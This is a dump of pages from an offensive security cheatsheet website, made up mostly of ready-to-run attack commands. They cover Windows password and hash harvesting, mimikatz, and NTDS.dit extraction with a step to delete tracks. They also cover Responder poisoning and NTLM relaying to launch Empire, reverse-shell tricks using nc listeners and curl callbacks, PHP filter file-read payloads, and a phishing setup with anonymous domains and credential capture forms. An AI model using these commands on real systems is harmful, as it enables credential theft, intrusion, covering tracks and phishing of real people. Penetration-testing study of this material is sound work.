C:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].log C:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log# XAMPP, Apache, or PHP, configuration files ? dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf powershell\u0026gt; Get-Childitem –Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue# Interesting files ? dir /s *pass* == *vnc* == *.config* 2\u0026gt;nul powershell\u0026gt; Get-Childitem –Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue # Files containing password ? findstr /si password *.xml *.ini *.txt *.config 2\u0026gt;nul powershell\u0026gt; Get-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern \u0026#34;password\u0026#34; \nGPO # Group Policy Preference # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s \nGathering Passwords/Hashes # VNC reg query \u0026#34;HKCU\\Software\\ORL\\WinVNC3\\Password\u0026#34; # Windows autologin reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; # SNMP Paramters reg query \u0026#34;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026#34; # Putty reg query \u0026#34;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026#34; # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s# You can find passwords in arbitrary files findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini # Find all passwords in all files findstr /spin \u0026#34;password\u0026#34; *.* # Some common files to find them in dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini # Stuff in the registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; reg query \u0026#34;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026#34; reg query \u0026#34;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026#34; reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password # Search for passwords in the registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s # searhc for files containing keywoards dir /s *pass* == *cred* == *vnc* == *.config* # Interesting files C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml# Enumerate stored WiFi settings and get possible stored passwords (netsh wlan show profiles) | Select-String \u0026#34;\\:(.+)$\u0026#34; | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\u0026#34;$name\u0026#34; key=clear)} | Select-String \u0026#34;(Key Content|Contenu de la clé)\\W+\\:(.+)$\u0026#34; | %{$pass=$_.Matches.Groups[2].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize.\\PwDump7.exe (nécessite libay32.dll) =\u0026gt; Dump SAM base .\\mimikatz.exe privilege::debug privilege::backup token::elevate# SAM and SYSTEM files %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system"
},
{
	"uri": "/network/port-scanning/masscan_cheatsheet/",
	"title": "Masscan Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Usage and Options Target speficication # Target specification masscan 10.0.0.1 masscan 10.0.0.0/24 192.168.1.0/24 # Exclude IP file masscan 10.0.0.1/24 --excludeFile \u0026lt;file\u0026gt; # Exclude a single IP from the scan masscan 180.215.0.0/16 --exclude=180.215.122.120 Port specification # Port specification masscan 10.0.0.0.1 -p 80 masscan 10.0.0.0.1 -p 0-65535 masscan 10.0.0.0.1 -p 80,443 # UDP Scan masscan 10.0.0.0.1 -pU 53 Timing and Performance # Used to scan in offline mode # It does not send any traffic but just estimate the time length masscan 0.0.0.0/24 --offline # Using the rate to send X packets per second masscan 10.0.0.1/24 --rate 10000# Get banners from services (only few protocols supported) # Problem is that masscan uses his own TCP/IP stack so when the local system # received a SYN-ACK from the probed target, it responds with a TST packet that # kills the connection before the banner information can be grabbed. # You can use --source-ip to assign another IP to prevent masscan 10.0.0.1 --banners # Assign masscan to another IP masscan 10.0.0.1 --source-ip 192.168.1.200 # Include a ping masscan 10.0.0.1 --ping # Change the default user agent masscan 10.0.0.1 --http-user-agent \u0026lt;user-agent\u0026gt; # Report only open ports masscan 10.0.0.1 --open-only # Save sent packet in PCAP masscan 10.0.0.1 --pcap \u0026lt;filename\u0026gt; # Print packets in terminal (ok in low rate but RIP terminal with high rates) masscan 10.0.0.1 --packet-trace \nOutput # Output in binary mode massscan 10.1.1.1/24 -p 80 -oB \u0026lt;filename\u0026gt; # Output in XML format massscan 10.1.1.1/24 -p 80 -oX \u0026lt;filename\u0026gt; # Output in grepable format massscan 10.1.1.1/24 -p 80 -oG \u0026lt;filename\u0026gt; # Output in JSON format massscan 10.1.1.1/24 -p 80 -oJ \u0026lt;filename\u0026gt; # Output in simple list format massscan 10.1.1.1/24 -p 80 -oL \u0026lt;filename\u0026gt; # Read a binary output and writes it to the console masscan --readscan bin-test.scan # Read a binary scan and convert it to another format masscan --readscan bin-test.scan -oX bin-test.xml \nComplete commands # Quick port identification # - Subnet target # - Port range # - High speed masscan 10.1.1.1/24 -p 0-65535 --rate 1000000 --open-only --http-user-agent \\ \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\  -oL \u0026#34;output.txt\u0026#34; # Multiple targets specific scan # - Known ports # - Fast rate 100.000 # - Banner grabbing and another source IP # - Only open ports # - Modified user-agent masscan \u0026lt;target1\u0026gt; \u0026lt;target2\u0026gt; \u0026lt;target3\u0026gt; -p 80,433 --rate 100000 --banners --open-only\\ --http-user-agent \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\ --source-ip 192.168.100.200 -oL \u0026#34;output.txt\u0026#34; # TOP 20 ports scanning # Modified user-agent # Medium speed masscan \u0026lt;target\u0026gt; -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080\\ --http-user-agent \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\ --rate 100000 --oL \u0026#34;output.txt\u0026#34; # In some cases, masscan can be better than nmap # For example, when searching for a big range on some ports only # (Internal pentest for example) you can do multiple iterations of scans # XML output are interesting for db_import in metasploit sudo masscan \u0026lt;target/16\u0026gt; -p 22 --rate 2000 -oX output_port_22.xml"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/methodology/",
	"title": "Methodology",
	"tags": [],
	"description": "",
	"content": " Gap Analysis \u0026amp; others # In OSINT - Analytical mind # Ask a lot of questions : Who, What, When, Where, Why, and How # Be Curious and Craft a Storyline # Use Gap Analysis shttps://nixintel.info/osint/using-gap-analysis-to-keep-osint-investigations-on-track/ 1. What do we know ? 2. What does the information mean? 3. What do I still need to know? 4. How do I find out? # Reflect on failures but also wins 1. What part is taking the most time? 2. Is this necessary for the investigation? 3. What could I change in my process? 4. Could any part be automated? 5. Who could I ask for input/advice? \nPreserving data \u0026amp; recover # Great post, presenting why it\u0026#39;s important and some tools https://nixintel.info/osint/the-attrition-of-information-in-osint-why-acting-quickly-matters-and-how-to-recover-when-you-dont/# Preservation tools # Screenshots # --\u0026gt; Fireshot (extension) # --\u0026gt; Shutter (Linux) # --\u0026gt; Snipping Tool (Windows) # Saving a web page https://tweetbeaver.com/ # Twitter https://pypi.org/project/twint/ # Twitter https://archive.is/ https://www.httrack.com/page/1/en/index.html https://mrs0m30n3.github.io/youtube-dl-gui/ # Not only Youtube # Complete Browser http://osirtbrowser.com/?LMCL=J79jsX# Recovery Tools # Google Cache # Time parameter search can also filter # Wayback Machine https://archive.org/ # Reddit https://www.resavr.com/ https://snew.notabug.io/r/all \nStoring and indexing local data # Tools like recoll can help to index gathered data and to fastly search for them locally https://doc.ubuntu-fr.org/recoll https://www.lesbonscomptes.com/recoll/ \nInvestigate a website (crosspost Domains \u0026amp; URL) # Thread by Aware Online about some website investigation methodology https://twitter.com/aware_online/status/1308312883248467975 # 1 - Tactical informations # 2 - WHOIS # 3 - Archives # 4 - Text # 5 - Reverse Image Search # 6 - Images and EXIF data # 7 - Source code # 8 - Others TLD # 9 - Mentions of target # 10 - Check infos via RSS # 11 - SSL certificates # 12 - Robots/Sitemap # 13 - Port scans # 14 - Reverse IP lookup # 15 - Reverse DNS lookup # 16 - Monitoring changes # 17 - Malware check \nScreenshots https://twitter.com/Sector035/status/1335539230072823809 # Mac - Monosnap (img+vid): https://monosnap.com # Win - ShareX (img+vid+GIF): https://getsharex.com/ # Linux - Flameshot (img): https://github.com/flameshot-org/flameshot \nWorkflow Domain \n# This one is good too https://twitter.com/sinwindie/status/1251320697370095617?s=20 @sinwindie \nE-mail \nUsername \nReal Name \nPhone \nLocation \n"
},
{
	"uri": "/shells-methods/methodology/",
	"title": "Methodology",
	"tags": [],
	"description": "",
	"content": " https://dolosgroup.io/blog/remote-access-cheat-sheet\nGOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  \nMethodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ? Check echo about system, passthru, shell_exec, exec to see if you can use them | | |________ Check commons binaries available on the system using which, locate, or by searching binaries | at /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin | | | | | |____ which which ls find python perl bash sh dash xterm php jsp java asp socat nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh | | | |________ Try to get a reverse shell at port 443, then 80, if not working | | | | | | | |____ Open 2000 ports on your server using nc | | for port in {1..2000};do nc -nlvp $port \u0026amp;;done | | | | | |____ Ask the target server to connect to those ports | | for port in {1..2000};do curl -X GET http://IP:$port/acknak | | 2\u0026gt;\u0026amp;1;done | | | | | | | |____ Repeat until you iterated all ports | | | | | | | |____ Reverse Shell on the port you've been hit | | | | |________ Still not working ? Go bind shell | | |_____ Test port 443, 80, then try the nc opening ports tricks by swapping the server/client role  "
},
{
	"uri": "/windows-systems/post-exploitation-techniques/ntds_database/",
	"title": "NTDS Database",
	"tags": [],
	"description": "",
	"content": " # Initial location of the NTDS database on the domain controller C:\\Windows\\NTDS\\NTDS.dit # Step 1 → Finding a way to get the NDTS.dis and SYSTEM file # Step 2 → Crack/Analyze offline \nLocal Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow Copy C:\\Windows\\system32\u0026gt; vssadmin create shadow /for=C: # Retrieve NTDS from the copy C:\\Windows\\system32\u0026gt; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy8\\windows\\ntds\\ntds.dit c:\\Extract\\ntds.dit # Copy SYSTEM file C:\\Windows\\system32\u0026gt; reg SAVE HKLM\\SYSTEM c:\\Extract\\SYS C:\\Windows\\system32\u0026gt; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy8\\windows\\system32\\config\\SYSTEM c:\\Extract\\SYSTEM # Delete tracks C:\\Windows\\system32\u0026gt; vssadmin delete shadows /shadow={uuid} ntdsutil tool # ntdsutil is a builtin tool used to manage the AD # You can abuse it and create a backup of the ntds.dit file ntdsutil activate instance ntds ifm create full C:\\ntdsutil quit quit DC Sync / Mimikatz # DC Sync is a less noisy way to extract users informations # It uses the DRS (Directory Replication Service) # Classic mimikatz # lsadump::dcsync /domain:domain.lan /all /csv # Specific user mimikatz # lsadump::dcsync /domain:domain.lan /user:test PowerSploit # PowerSploit contains a script using the volume shadow copy service Import-Module .\\VolumeShadowCopyTools.ps1 New-VolumeShadowCopy -Volume C:\\ Get-VolumeShadowCopy # Also possible through a meterpreter session powershell_shell New-VolumeShadowCopy -Volume C:\\ Get-VOlumeShadowCopy Invoke-DCSync # Powershell script # Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz Invoke-DCSync # Get other format (user:id:lm:ntlm) Invoke-DCSync -PWDumpFormat # It is also possible through a meterpreter session Nishang # Nishang is a post exploitation framework allowing attacker to perform attacks # You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files Import-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\  # You can also use them throught a meterpretrer session by loading the powershell extension load powershell powershell_import /root/Copy-VSS.ps1 powershell_execute Copy-VSS # Also possible to establish a direct connection powershell_shell PS \u0026gt; Copy-VSS PS \u0026gt; Copy-VSS -DestinationDir C:\\Ninja \nRemote Extraction CrackMapExec crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi WMI - Remote # It is possible to remotely extract the NTDS database using WMI and VSSADMIN wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c vssadmin create shadow /for=C: 2\u0026gt;\u0026amp;1\u0026#34; wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2\u0026gt;\u0026amp;1\u0026#34; wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\ C:\\temp\\SYSTEM.hive 2\u0026gt;\u0026amp;1\u0026#34; Impacket $ python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd\\!@DC1.FOO.LOCAL $ python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd\\!@DC1.FOO.LOCAL NTDS Extraction and analysis # Impacket provides a usefull script to do that (decrypt copied files) impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN # Also possible to dump it remotely by using the computer account and its hash impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 # Extraction is also possible using NTDSDumpEx NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive # Or adXtract ./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab Empire # Empire has 2 modules you can use to retrieve hashes through DCSync usemodule credentials/mimikatz/dcsync_hashdump usemodule credentials/mimikatz/dcsync"
},
{
	"uri": "/windows-systems/network-and-domain-recon/",
	"title": "Network and Domain Recon",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/",
	"title": "Offensive Security Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Offensive Security Cheatsheet Informations \u0026amp; Disclaimer 1/ This website is my personnal cheatsheet, a document used to centralize many informations about cybersecurity techniques and payloads. 2/ Content, commands and tools provided on this website can cause damages to websites and systems you might want to use them against. Remember that is is illegal to scan or attack a resource that does not belong to you. 3/ Content is taken from my personnal experience but also from several online resources and cheatsheets. I also made a resources sections, linking to several resources I found or used. This section has been made lately, so all informations might not be sourced (but well, I try to)! 4/ This website is for educationnal and \u0026quot;memo\u0026quot; purpose only. It does not aim to weaponize anyone. 5/ If you have any request (Something that is wrong, removing informations...) please do not hesitate to contact me on Twitter (@Haax9_). 6/ If this place have been useful to you, leave a star on the github project, or retweet/follow through Twitter (@Haax9_). Don't mind sharing it, as it could help others too =). 7/ I'm also posting some writeups (HackTheBox, CTF..) and other cybersecurity stuff on a blog, available in French and English ! --\u0026gt; https://haax.fr  \nUpdates 14/07/2021 - General Info : - Update format modified (category instead of information type, web, OSINT, Windows...) - CTI : - Resource : A Cyber Threat Intelligence Self-Study Plan: Part 1 - Web : - Tool : Qsreplace - Tool : Nuclei usage and infos - Tool : page-fetch - Tool : x8 - Tool : NoSQLMap - Tool : subjs / LinkFinder / SecretFinder (JS extraction) - Tool : XSStrike - Resource : Prototype Pollution - Resource : x8, Arjun, Param Miner comparison - OSINT : - Tool : Ignorant (Phone numbers) - Tool : Zoom.earth (GEOINT) - Tool : Justgetmydata website (OPSEC) - Tool : Elephind (Newspaper Archives) - Tool : Peakvisor app (Mountains identification) - Tool : International Numbering Plan (Phone number analysis) - Tool : HLR Lookups (Phone identification) - Tool : Lusha - Tool : Kaspr - Tool : Whatsmyname.app - Tool : IP Reputation Lookup (Team Cymru) - Tool : Thingful.net (IoT map) - Tool : w3dt.net (DNS, HTTP, Database lookups...) - Tool : Crobat / Sonarsearch / Omnisint (Web/DNS) - Resource : The space speedometer : Using some simple algebra and satellite imagery to determine ship speed - Resource : \u0026quot;OSINT\u0026quot; : Explorer l'espace informel Russe (OSINT Russia guide) - Resource : Geolocating a Plane Shot Down in Ethiopia – Case Studies on Mountain Profiling with PeakVisor - Resource : Phone numbers investigation, the open source way - Windows Systems : - Tool : Bloodhound-quickwins - Tool : AzureAD enumeration module - Tricks/Methods : MS14-025 Cyberchef encryption - Tricks/Methods : AMSI Bypass methods - Tricks/Methods : [adsisearcher] built-in AD enumeration - Tricks/Methods : Kerberoasting attack without prior access - Resource : Kerberoasting without SPNs - Resource : Windows \u0026amp; Active Directory Exploitation Cheat Sheet and Command Reference - Resource : zer1t0's guide for attacking Active Directory (really great paper!) - Resource : Hunting for Skeleton Key implants - Resource : Hunting for Impacket - Resource : Windows AMSI Bypass links - MISC : - Tool : Passe-partout (SSL Extraction) - Tool : Swap Digger (Linux) - Tool : Argon2 Cracker - Tool : Message Header Analysis - New section : Kubernetes (Other Systems) - Resource : Privilege Escalation cheatsheet for OSCP (Vulnhub)  06/02/2021 - OSINT Tools : - DumpItBlue Extension - Maigret - Social Analyzer - OSINT.sh - World Postal Codes - Added \u0026quot;OSINT in the air\u0026quot; category! - OSINT Resources - Amnesty International Course : Open Source Investigations for Human Rights - Darknet Markets for Investigators - Flowcharts to distinguish European languages - OSINT Trick - Instagram trick for viewing post (/embed/captioned) - Web Pentest Tools - HTTP Methods Tester - Burp Suite Extension - Asset history - Firefox extension - HackTools - Bypa4xx tool - Findomain / Subfinder - Leaks - Breachdirectory - Cyber Threat Intel - APT Map - MISC - Le dessous des cartes Youtube channel (Geopolitics) - Windows Pentest - Precisions for Kerberos Delegations attacks  21/01/2021 - OSINT Tools : - Carbondate / Carbon14 - shadow calculator - Instagram Location Search - Searching unique identifier on Facebook - isearchfrom - Google Maps Alternatives - Screenshots - emailrep.io - 360cities - Holehe web version - Time and Date - OSINT Resources \u0026amp; Tricks : - The OSINT Library - Geotips - Open Street Map and Overpass part (OSINT/GEOINT) - some OSINT resources links - Infosec Resource : The Hacker Recipes - Windows Resource : WADComs interactive cheatsheet - Added OPSEC Resources - Added Any.run to resources - Updated the phishing part (SSL \u0026amp; tips) - Passcracking tool : Wrapcat - +Added previous unreported resources, tools and tips  \nAcknowledgments Special thanks to @Maki for teaching many tricks, methods and for the Hugo theme, but also to @_ACKNAK_ for the cheatsheet basis I started from, some months ago. And generally speaking, thanks to everyone sharing content and knowledge ! :)\n"
},
{
	"uri": "/open-source-intelligence-osint/",
	"title": "Open Source Intelligence (OSINT)",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/network-and-domain-recon/no_credentials_recon/",
	"title": "Out of Domain (No credentials)",
	"tags": [],
	"description": "",
	"content": " Identification # Passiv network listening to identify machines # By default, it uses interactive mode (incompatible with clean output) # You can use the -P option to get off interactive sudo netdiscover -p -i eth0 sudo netdiscover -p -i eth0 -P # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer\u0026#39;s MAC address to bypass NAC \nLLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they\u0026#39;re bad configured sudo responder -I eth0 -wFv # If you get hashes, will be necessary to crack them john --format=netntlmv2 --wordlist=\u0026#34;/usr/share/wordlists/rockyou.txt\u0026#34; hash.txt  \nResponder and Multirelay # You can link responder and multi relay to own machines # It\u0026#39;s important to know that SMB Signing must be disabled on machines for multirelay. # SMB Server must also be off on Responder. Responder will intercept and MultiRelay will relay hashes # HTTP and SMB are OFF in Responder.conf responder -I eth0 -rv responder -I \u0026lt;interface\u0026gt; -r -d -w # All captured hashes are stored and can be retrieved using the DumpHash.py script $ sudo python DumpHash.py# You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec python RunFinger.py -i 10.0.2.0/24 cme smb \u0026lt;CIDR\u0026gt; --gen-relay-list targets.txt # Then you will target one machine or one range for MultiRelay python MultiRelay.py -t 10.0.2.4 -u ALL ntlmrelayx.py -tf targets.txt ntlmrelayx.py -tf targets.txt -c \u0026lt;insert your Empire Powershell launcher here\u0026gt; # Then you can pop an interactive shell # And use for example mimikatz mimi sekurlsa::logonpasswords \nNTLM Relaying and Proxychains # Using socks settings in case of multiple sessions to handle # you can specify a target like this all://10.1.2.10 # It will target smb://’, ‘mssql://’, ‘http://’, ‘https://’, ‘imap://’, ‘imaps://’, ‘ldap://’, ‘ldaps://’ and ‘smtp://’ ./ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support # HTTP and SMB are OFF in Responder.conf responder -I eth0 -rv responder -I \u0026lt;interface\u0026gt; -r -d -w # If someone connects and is relayed # You can see sessions ntlmrelayx\u0026gt; socks # To use sessions, proxychains can be set up # /etc/proxychains.conf must be pointing toward the target host # Then you can use different tools to interact # For example, connect through SMB # If password asked, whatever proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1 proxychains ./mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth \nSNMP Communities # You can use metasploit to enumerate known SNMP communities auxiliary/scanner/snmp/snmp_enum # OneSixtyOne is another tool onesixtyone \u0026lt;target\u0026gt; public # Bruteforce using a dict onesixtyone -c wordlist \u0026lt;target\u0026gt; # Or you can use snmp-check snmp-check -t 192.168.1.2 -c public/private \nPhishing with Responder # Open Word -\u0026gt; CTRL + F9 # IMPORT \u0026#34;\\\\\\\\Responder-IP\\\\1.jpg\u0026#34; # Right click and select \u0026#34;Edit Field\u0026#34; # Tick \u0026#34;Data not stored in document\u0026#34; # Save \u0026amp; close. # Open the document -\u0026gt; free credentials :) \nAzure AD Recon https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # https://login.microsoftonline.com/getuserrealm.srf?login=username@gothamlab.onmicrosoft.com\u0026amp;xml=1 # If the NameSpaceType indicates \u0026#34;Managed\u0026#34;, then the company is using Azure AD. # Discover accounts # o365creeper can be used, it does not produce logs on the AD side https://github.com/LMGsec/o365creeper"
},
{
	"uri": "/web-pentest/php-vulnerabilities/php_filters/",
	"title": "PHP Filters",
	"tags": [],
	"description": "",
	"content": " PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php# iconv conversion filter can be used (https://gynvael.coldwind.pl/?lang=en\u0026amp;id=671) # allows you to use iconv to convert all processed data from charset A to charset B # where both character sets can be chosen from a surprisingly long list of supported encodings iconv -l # Example \u0026lt;?php $url = \u0026#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some\u0026lt;\u0026gt;text\u0026#34;; echo file_get_contents($url); // Output: // some+ADwAPg-text # Then you can use it to change the charset of your payload php://filter/convert.iconv.CHARSET1%2fCHARSET2/resource=/flag # Recovering process \u0026lt;?php $d = file_get_contents( \u0026#34;php://filter/convert.iconv.UTF-32BE%2fIBM1154/resource=\u0026#34;. \u0026#34;data:image/png;base64,AAAEWAAAACsAAARbAAAAIwAABFsAAAA/AA\u0026#34;. \u0026#34;AAKAAAAC8AAAA+AAAAYAAABCoAAAQFAAAEAwAABAYAAAAlAAAALwAABD\u0026#34;. \u0026#34;AAAACtAAAEUwAAAC8AAAA+AAAEDgAABAMAAAQFAAAEBwAAAD8AAAA/AA\u0026#34;. \u0026#34;AEBAAABAYAAAA/AAAEDAAAAGAAAAA/AAAEDwAAACcAAACO\u0026#34;); echo $d;"
},
{
	"uri": "/phishing-redteam-and-se/phishing_campaign_setup/",
	"title": "Phishing Infrastructure (Gophish+Vultr)",
	"tags": [],
	"description": "",
	"content": " General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo \u0026amp; permutations on a domain name https://dnstwister.report/# Message Header Analyzer https://mha.azurewebsites.net/ \nDebugging Tips / Important notes Blacklisted/Spam domain # If the domain is blacklisted / considered as spam, you can try to reference www.domain.fr, just update SSL certs Capturing data # Login form need to be in POST # Variables have to be set \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;form\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Username:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt; \u0026lt;label\u0026gt;Password:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; type=\u0026#34;password\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; E-mail not sent / TLS # For TLS, you could need to set option as \u0026#34;may\u0026#34; instead of \u0026#34;encrypt\u0026#34; # Another possible thing : postfix configuration https://www.digitalocean.com/community/questions/is-this-a-spammer-trying-to-access-or-just-the-system Incoherent raw events and results # If raw events are incoherent compared to gophish results, it may be caused by the \u0026#34;Email Opened\u0026#34; tracker. # If images are unavailable for the recipient, the tracker could not be triggered. # If so, the \u0026#34;E-mail Opened\u0026#34; event won\u0026#39;t be generated but Gophish will increment the counter if \u0026#34;Clicked Link\u0026#34; is triggered. # Solution : for these people, use the \u0026#34;Clicked Link\u0026#34; event as \u0026#34;E-mail Opened\u0026#34; for stats Embedded Images # In the actually HTML, reference the image by typing \u0026lt;img src=\u0026#34;cid:###\u0026#34;\u0026gt;. # The ### should be the EXACT file name uploaded like cat.png. # This will not put the attachment in the \u0026#34;attachment bar\u0026#34; in Outlook but embed it directly where # the image tag is located inline in the email without requiring the downloading of external resources. Statistics # Timeline # Get sorted and unique data for users # The awk part allows to manipulate/sort on only one part of the line cat raw_events.csv | grep \u0026#34;Submitted\u0026#34; | cut -d \u0026#39;,\u0026#39; -f 1,2 | awk -F, \u0026#39;!seen[substr($1,1,8)]++\u0026#39; # Dirty solution to deal with Gophish UTC hours \u0026gt;\u0026gt;\u0026gt; events = open(\u0026#34;CUTED_EVENTS\u0026#34;,\u0026#34;r\u0026#34;) \u0026gt;\u0026gt;\u0026gt; outfile = open(\u0026#34;PARSED_EVENTS\u0026#34;,\u0026#34;w\u0026#34;) \u0026gt;\u0026gt;\u0026gt; for event in events: ... tbl1 = event.split(\u0026#39;T\u0026#39;) ... tbl2 = tbl1[1].split(\u0026#39;:\u0026#39;) ... if tbl2[0] == \u0026#34;24\u0026#34;: ... realHour = \u0026#34;00\u0026#34; ... else: ... realHour = int(tbl2[0]) + 1 ... realEvent = tbl1[0] + \u0026#39;T\u0026#39; + str(realHour) + \u0026#34;:\u0026#34; + tbl2[1] + \u0026#34;:\u0026#34; + tbl2[2] ... outfile.write(realEvent) ... print(realEvent) Testing e-mail \u0026ldquo;spam\u0026rdquo; level https://www.mail-tester.com/ # Making a text version of your HTML e-mail can also be usefull to avoid spam \nDomain Configuration # First step is to buy a domain name # Ex : totallylegit.eu # internetbs, gandhi, OVH... # InternetBS can be a good option because it is offshore # Data has to be anonymous to avoid WHOIS leaks # Configure to not disclose any e-mail # Also possible to use fake but realistic Names, Adresses...# If using Vultr, change DNS in the management of the domain name ns1.vultr.com ns2.vultr.com \nVPS (Vultr) general configuration Firewall # Create a new Firewall group in Vultr and link it to the VPS # Default behavior is dropping everything # Create accept rules for SSH connections for your public IP adresses ACCEPT TCP 2233 xxx.xxx.xxx.xxx/32 ACCEPT TCP 2233 xxx.xxx.xxx.xxx/32 # Create accept rules for Gophish administration panel # Only for your public IP adresses ACCEPT TCP 3333 xxx.xxx.xxx.xxx/32 ACCEPT TCP 3333 xxx.xxx.xxx.xxx/32 ACCEPT TCP 80 0.0.0.0/0 ACCEPT TCP 25 0.0.0.0/0 \nDNS # 3 configuration parts : # - Create a new DNS Entry by setting server IP and domain name # - Add the DNS entries provided by the server configuration part (see below) # - Then, in the server settings, set the reverse DNS to the domain name used \nServer configuration Global System Settings # Prepare debian sudo apt-get update sudo apt-get upgrade sudo apt-get install unzip git sudo apt-get remove -qq -y exim4 exim4-base exim4-config exim4-daemon-light sudo rm -r /var/log/exim4/ sudo update-rc.d nfs-common disable \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 sudo update-rc.d rpcbind disable \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 sudo timedatectl set-timezone Europe/Paris 